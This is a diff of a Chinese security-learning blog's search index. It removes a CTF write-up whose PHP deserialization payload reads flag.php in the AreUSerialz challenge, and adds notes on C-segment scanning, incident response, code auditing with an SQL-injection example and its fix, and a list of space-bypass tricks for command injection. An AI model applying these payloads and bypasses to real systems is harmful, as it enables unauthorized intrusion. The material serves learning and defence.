@@ -1,59 +1,47 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2020-网鼎杯-青龙组-Web-AreUSerialz</title>
-    <url>/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/</url>
-    <content><![CDATA[<p>知识点：php代码审计，魔术方法，php反序列化，弱类型绕过</p>
-<span id="more"></span>
-
-<p>题目：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//包含flag.php,显然要读取这个文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;<span class="comment">//类</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//构造函数，创建对象时触发其中内容，所以我们要构造一个类来触发</span></span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//让op == &quot;2&quot;来触发下面的读取函数</span></span><br><span class="line">      <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();<span class="comment">//读取函数</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//析构函数,销毁类的时候，也就是在最后执行</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//===弱类型，强制将2转换为1，所以考虑绕过，加空格 op =‘ 2‘</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);<span class="comment">//反序列化，所以要先将对象序列化</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>ctfhub靶场实操：</p>
-<p>开启容器：<img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190830042.png" alt="image-20230211190830042"></p>
-<p>给出源代码：</p>
-<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211185816020.png" alt="image-20230211185816020"></p>
-<p>根据前文代码审计编写php脚本：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot; &quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>构造payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot;%202&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;%20&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>拼接：</p>
-<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190135812.png" alt="image-20230211190135812"></p>
-<p>查看源码：</p>
-<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190155840.png" alt="image-20230211190155840"></p>
-<p>得到flag</p>
-]]></content>
-      <categories>
-        <category>实验</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>代码审计</tag>
-        <tag>反序列化</tag>
-        <tag>弱类型绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>app抓不到包解决思路</title>
-    <url>/2023/02/19/app%E6%8A%93%E4%B8%8D%E5%88%B0%E5%8C%85%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF/</url>
-    <content><![CDATA[<h2 id="1-检测到模拟器环境"><a href="#1-检测到模拟器环境" class="headerlink" title="1.检测到模拟器环境"></a>1.检测到模拟器环境</h2><ol>
-<li>将app安装到手机上</li>
-<li>电脑和手机（模拟器）在同一个局域网</li>
-</ol>
-<p>​	3.burp抓手机的包</p>
-<h2 id="2-app代理检测导致burp代理时无法正常访问"><a href="#2-app代理检测导致burp代理时无法正常访问" class="headerlink" title="2.app代理检测导致burp代理时无法正常访问"></a>2.app代理检测导致burp代理时无法正常访问</h2><p>​	使用 Postern-3.1.2.apk 工具，下载地址 <a href="https://github.com/postern-overwal/postern-stuff%EF%BC%8C%E5%B7%A5%E5%85%B7%E4%BD%9C%E7%94%A8%E6%98%AF%E5%B0%86%E4%BB%A3%E7%90%86%E7%BD%AE%E4%B8%BA">https://github.com/postern-overwal/postern-stuff，工具作用是将代理置为</a> vpn 代理绕过检测。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	抓不到包，尝试直接在手机上操作或者挂代理</p>
+    <title>c段信息收集</title>
+    <url>/2023/02/24/c%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h2 id="c段"><a href="#c段" class="headerlink" title="c段"></a>c段</h2><p>IP地址分为A类，B类，C类等。A类的网络位为8位，主机位24位；B类的网络位为16位，主机位16位；C类的网络位为24位，主机位8位。</p>
+<p>通过对C类IP的主机位进行遍历，查找在同一网络位的情况下，存活那些主机，就是C段扫描，</p>
+<p>C段主机是指与目标服务器在同一C段网络的服务器，攻击目标的C段存活主机是信息收集的重要步骤，很多企业的内部服务器可能都会在一个C段网络中，在很难找到攻击目标服务器互联网漏洞的情况下，可以通过攻击C段主机，获取对C段主机的控制权，进入企业内网环境中，在企业内网安全隔离以及安全防护不如互联网防护健全的情况下，可以通过C段的主机进行内网渗透，这样可以绕过互联网防护机制，对目标进行攻击</p>
+<p>参考文章：</p>
+<p><a href="https://blog.csdn.net/weixin_56319791/article/details/127424861">https://blog.csdn.net/weixin_56319791/article/details/127424861</a></p>
 ]]></content>
       <categories>
         <category>学习</category>
       </categories>
       <tags>
-        <tag>app</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应急响应总结</title>
+    <url>/2023/02/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="PDCERF-国际权威应急响应流程"><a href="#PDCERF-国际权威应急响应流程" class="headerlink" title="PDCERF(国际权威应急响应流程)"></a>PDCERF(国际权威应急响应流程)</h2><p>PDCERF 方法论是一种防范使用的方法，其将应急响应分成六个阶段，分别是准备阶段、检测阶段、抑制阶段、根除阶段、恢复阶段、总结阶段。</p>
+<p><img src="https://pic1.zhimg.com/v2-0be516bc34e75f8b7f249b989820e340_r.jpg" alt="preview"></p>
+<span id="more"></span>
+
+<p>入侵情景：</p>
+<ol>
+<li>网站页面遭到篡改、被挂暗链、黑链；</li>
+<li>对外提供服务的服务器存在木马、挖矿软件、VPN等异常程序；</li>
+<li>发现异常链接、cpu占用率飙升、服务器卡死；</li>
+<li>安全软件检测到网内存在大量异常链接、占用带宽资源。导致单位无法正常上网；</li>
+<li>dos大规模流量攻击；</li>
+<li>安全监管部门检测发现该单位存在异常而被通告</li>
+</ol>
+<p>参考文章：</p>
+<p><a href="https://www.cnblogs.com/simon7s/p/12484155.html">https://www.cnblogs.com/simon7s/p/12484155.html</a></p>
+<p><a href="https://www.freebuf.com/articles/web/198443.html">https://www.freebuf.com/articles/web/198443.html</a></p>
+<p><a href="https://www.wangan.com/wenda/2829">https://www.wangan.com/wenda/2829</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
       </tags>
   </entry>
   <entry>
@@ -80,6 +68,221 @@
       <tags>
         <tag>代码审计</tag>
         <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码审计总结</title>
+    <url>/2023/02/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h2 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h2><h4 id="1-可控变量"><a href="#1-可控变量" class="headerlink" title="1.可控变量"></a>1.可控变量</h4><p>​	接收变量如：get,post </p>
+<p>​	接收关键字：$_GET</p>
+<h4 id="2-特定函数"><a href="#2-特定函数" class="headerlink" title="2.特定函数"></a>2.特定函数</h4><p>​	输出 print echo</p>
+<p>​	数据库操作语句</p>
+<h4 id="3-搜索特定关键字寻找特定漏洞"><a href="#3-搜索特定关键字寻找特定漏洞" class="headerlink" title="3.搜索特定关键字寻找特定漏洞"></a>3.搜索特定关键字寻找特定漏洞</h4><p>​	如：select、insert、update等sql执行语句 &#x3D;&#x3D;&#x3D;》sql注入漏洞 </p>
+<p>​	如：搜索echo、print尝试挖掘xss漏洞</p>
+<p>​	如：<code>$_GET</code>、<code>$_post</code>&#x3D;&#x3D;》数据包漏洞</p>
+<span id="more"></span>
+
+<h2 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h2><ol>
+<li>理解应用程序或系统的功能和架构。这有助于确定应该关注哪些部分的代码，并有助于识别潜在的安全漏洞。</li>
+<li>寻找输入验证不足的漏洞。输入验证是应用程序或系统保护自身免受恶意输入的第一道防线。不正确的输入验证可能导致诸如SQL注入、跨站脚本（XSS）和跨站请求伪造（CSRF）等安全漏洞。</li>
+<li>寻找敏感数据泄露的漏洞。这些漏洞可能导致应用程序或系统泄露敏感数据，如用户名、密码、信用卡信息等。</li>
+<li>寻找授权和身份验证问题。这些漏洞可能导致未经授权的用户访问敏感信息或执行敏感操作。</li>
+<li>检查代码是否存在逻辑错误。这些漏洞可能导致应用程序或系统的意外行为，例如未经授权的操作或意外数据泄露。</li>
+<li>使用自动化工具辅助代码审计。有许多工具可用于自动化代码审计过程，例如静态代码分析工具和漏洞扫描器。但是，自动化工具不是万能的，它们通常只能检测一些常见的漏洞，并可能会误报或漏报漏洞。</li>
+</ol>
+<h2 id="php代码审计案例"><a href="#php代码审计案例" class="headerlink" title="php代码审计案例"></a>php代码审计案例</h2><p>假设有一个 PHP 程序，它使用 POST 请求从客户端接收用户名和密码，然后将它们存储在 MySQL 数据库中。在这个程序中，存在 SQL 注入漏洞，攻击者可以使用特定的输入值绕过应用程序的输入验证，从而获得对数据库的非授权访问。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;users&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO users(username, password) VALUES(&#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;User created successfully.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上述代码中，输入验证的缺失在于，应用程序直接将接收到的 <code>$_POST[&#39;username&#39;]</code> 和 <code>$_POST[&#39;password&#39;]</code> 值插入 SQL 语句中，而没有对它们进行任何过滤或转义。因此，攻击者可以通过在输入中插入 SQL 语句，从而获得对数据库的非授权访问。</p>
+<p>要修复这个漏洞，可以使用预处理语句和参数化查询：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;users&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO users(username, password) VALUES(?, ?)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;User created successfully.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用预处理语句和参数化查询，应用程序会将输入值视为参数，而不是字符串。因此，即使攻击者尝试通过插入 SQL 语句来攻击应用程序，输入值也不会被视为 SQL 代码而被执行。</p>
+<h3 id="php代码审计要点"><a href="#php代码审计要点" class="headerlink" title="php代码审计要点"></a>php代码审计要点</h3><ol>
+<li>输入验证：验证输入数据的类型、长度、格式和范围，防止恶意用户提交非法输入数据。</li>
+<li>访问控制：限制用户对应用程序中的资源的访问权限，防止未授权的用户访问敏感信息。</li>
+<li>会话管理：确保会话ID的随机性和唯一性，验证会话数据的完整性和有效性，防止会话劫持和会话固定攻击。</li>
+<li>数据库安全：避免SQL注入攻击，使用预编译语句和参数化查询来处理用户输入的数据。</li>
+<li>文件上传：对上传的文件进行验证和过滤，限制上传的文件类型、大小和数量，防止文件包含漏洞和文件上传漏洞。</li>
+<li>输出过滤：对输出到浏览器的内容进行过滤和转义，防止跨站脚本攻击和HTML注入攻击。</li>
+<li>加密和解密：使用加密算法保护敏感数据的机密性，确保数据的完整性和可用性，防止加解密漏洞。</li>
+<li>错误处理：避免敏感信息泄漏，将错误信息记录到日志中，提供有用的错误信息提示给开发者，防止信息泄露。</li>
+<li>代码注释和文档：提供清晰的代码注释和文档，便于代码的维护和修改，防止代码混乱和漏洞。</li>
+</ol>
+<h4 id="trim-函数"><a href="#trim-函数" class="headerlink" title="trim() 函数"></a>trim() 函数</h4><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
+<p>一般是用来去除字符串首尾处的空白字符（或者其他字符），一般在用在服务端对接收的用户数据进行处理，以免把用户误输入的空格存储到数据库，下次对比数据时候出错。</p>
+<h4 id="常见绕过空格命令分隔符"><a href="#常见绕过空格命令分隔符" class="headerlink" title="常见绕过空格命令分隔符"></a>常见绕过空格命令分隔符</h4><p>1、%0a符号：换行符</p>
+<p>2、%0d符号：回车符</p>
+<p>3、&lt; 号</p>
+<p>4、%09符号</p>
+<p>5、$IFS$9(数字无限制)符号</p>
+<p>6、${IFS}符号</p>
+<p>7、，号</p>
+<p>8、&lt;&gt;号</p>
+<p>9、$IFS符号</p>
+<p>10、以及过滤掉的内容</p>
+<h4 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord() 函数"></a>ord() 函数</h4><p>ord() 函数:返回字符串的首个字符的 ASCII 值。</p>
+<h4 id="REQUEST、-POST、-GET的区别和联系"><a href="#REQUEST、-POST、-GET的区别和联系" class="headerlink" title="$_REQUEST、$_POST、$_GET的区别和联系"></a>$_REQUEST、$_POST、$_GET的区别和联系</h4><ol>
+<li><code>$_REQUEST</code></li>
+</ol>
+<p>PHP中，<code>$_REQUEST</code>可以获取POST方法和GET方法提交的数据，但是传输的速度相对较慢。</p>
+<ol start="2">
+<li><code>$_GET</code></li>
+</ol>
+<p>$_GET用来获取由浏览器通过$_GET方法提交的数据。<code>$_GET</code>方法就是通过把参数数据加在提交表单的action属性所指的URL中，值和表单内的每个字段一一对应，并且在URL中可以看到，但是同样也存在问题：</p>
+<p>• 安全性差，在URL中可以体现</p>
+<p>• 传输数据量较小，不能大于2KB。</p>
+<ol start="3">
+<li><code>$_POST</code></li>
+</ol>
+<p>$_POST用来获取由浏览器通过POST方法提交的数据。<code>$_POST</code>方法是通过HTTP POST机制，将表单的各个字段放置在HTTP HEADER内一起传送到action属性所指的URL中，用户看不到此过程。提交的大小一般来说不受限制，但是具体根据服务器的不同，略有不同，比如PHP版本5.512，默认POST最大值为3M，有的则为8M，IIS6默认最大则为200K。</p>
+<p>相对于<code>$_GET</code>方法安全性稍高。</p>
+<ol start="4">
+<li>三者之间的区别和联系</li>
+</ol>
+<p><code>$_REQUEST</code>[“参数”]具有$_POST[“参数”]， <code>$_GET</code>[“参数”]的功能,但是<code>$_REQUEST</code>[“参数”]比较慢。通过$_POST和$_GET方法提交的所有数据都可以通过<code>$_REQUEST</code>数组[“参数”]获得。</p>
+<h4 id="sql注入需要关注的关键字"><a href="#sql注入需要关注的关键字" class="headerlink" title="sql注入需要关注的关键字"></a>sql注入需要关注的关键字</h4><table>
+<thead>
+<tr>
+<th>select from</th>
+<th>数据库查询</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mysql_connect</td>
+<td>数据库连接</td>
+</tr>
+<tr>
+<td>mysql_query</td>
+<td>数据库请求</td>
+</tr>
+<tr>
+<td>mysql_fech_row</td>
+<td>数据库请求</td>
+</tr>
+<tr>
+<td>update,insert,delete</td>
+<td>增删改</td>
+</tr>
+<tr>
+<td>urldecode、rawurldecode</td>
+<td>二次urldecode注入函数，比如我们提交id&#x3D;1%2527,webserver第一次解析式id&#x3D;1%27，urldecode第二次解析就会变成id&#x3D;1‘.造成单引号引入引发注入</td>
+</tr>
+</tbody></table>
+<h4 id="xss输出函数关键字"><a href="#xss输出函数关键字" class="headerlink" title="xss输出函数关键字"></a><strong>xss输出函数关键字</strong></h4><table>
+<thead>
+<tr>
+<th>print</th>
+<th>输出字符串</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>print_r</td>
+<td>打印变量</td>
+</tr>
+<tr>
+<td>echo</td>
+<td>输出一个或多个字符串</td>
+</tr>
+<tr>
+<td>var_dump</td>
+<td>打印变量的相关信息</td>
+</tr>
+<tr>
+<td>var_export</td>
+<td>输出或返回变量中的字符串</td>
+</tr>
+<tr>
+<td>die</td>
+<td>函数输出一条消息，并退出当前脚本</td>
+</tr>
+<tr>
+<td>printf</td>
+<td></td>
+</tr>
+<tr>
+<td>sprintf</td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p>直接搜索move_uploaded_file()，再去看调用这个函数的代码是否有上传格式校验措辞，以及校验措施是否可以绕过即可</p>
+<h4 id="CSRF审计"><a href="#CSRF审计" class="headerlink" title="CSRF审计"></a>CSRF审计</h4><p>CSRF需要了解项目大致代码结构，找出和后台及核心模块相关的功能代码，然后查看是否有缺失token referer相关验证代码，然后黑盒判断不需要token和referer可以请求和返回同样的数据，则判断可能存在CSRF漏洞</p>
+<p>1.后台功能模块：管理后台&#x2F;会员中心&#x2F;添加用户等。<br>2.被引用的核心文件里面有没有验证token和referer相关的代码<br>3.没带token：可以直接请求这个页面。<br>4.没带referer：返回相同的数据</p>
+<p>参考文章：</p>
+<p><a href="https://www.freebuf.com/articles/web/340873.html">https://www.freebuf.com/articles/web/340873.html</a></p>
+<p><a href="https://blog.csdn.net/u014247926/article/details/127117877">https://blog.csdn.net/u014247926/article/details/127117877</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网基础</title>
+    <url>/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p><img src="/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/image-20230220133523195.png" alt="image-20230220133523195"></p>
+<span id="more"></span>
+
+<h2 id="相关基础概念"><a href="#相关基础概念" class="headerlink" title="相关基础概念"></a>相关基础概念</h2><h5 id="1-DMZ"><a href="#1-DMZ" class="headerlink" title="1.DMZ"></a>1.DMZ</h5><p>​		DMZ，是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。它是为了解决安装<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99/52767?fromModule=lemma_inlink">防火墙</a>后外部网络的访问用户不能访问内部<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8/99096?fromModule=lemma_inlink">网络服务器</a>的问题，而设立的一个非安全系统与<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/3131501?fromModule=lemma_inlink">安全系统</a>之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571?fromModule=lemma_inlink">服务器</a>设施，如企业<a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/8390210?fromModule=lemma_inlink">Web服务器</a>、<a href="https://baike.baidu.com/item/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1926327?fromModule=lemma_inlink">FTP服务器</a>和<a 